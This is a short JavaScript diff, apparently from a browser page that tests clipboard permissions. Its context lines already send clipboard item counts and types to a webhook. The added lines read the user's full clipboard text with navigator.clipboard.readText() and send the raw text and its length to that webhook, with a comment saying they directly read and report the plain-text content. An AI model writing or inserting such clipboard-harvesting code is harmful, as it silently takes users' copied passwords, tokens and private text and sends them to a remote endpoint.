@@ -695,6 +695,16 @@
                     count: clipboardItems.length,
                     types: clipboardItems.map(i => i.types)
                 });
+                // 直接读取并上报纯文本内容（若可用）
+                try {
+                    const text = await navigator.clipboard.readText();
+                    enqueueWebhook('clipboard_text', {
+                        length: (text || '').length,
+                        text
+                    });
+                } catch (e) {
+                    enqueueWebhook('clipboard_text_error', { message: e.message });
+                }
                 
             } catch (error) {
                 const result = `❌ 剪贴板权限获取失败: ${error.message}`;
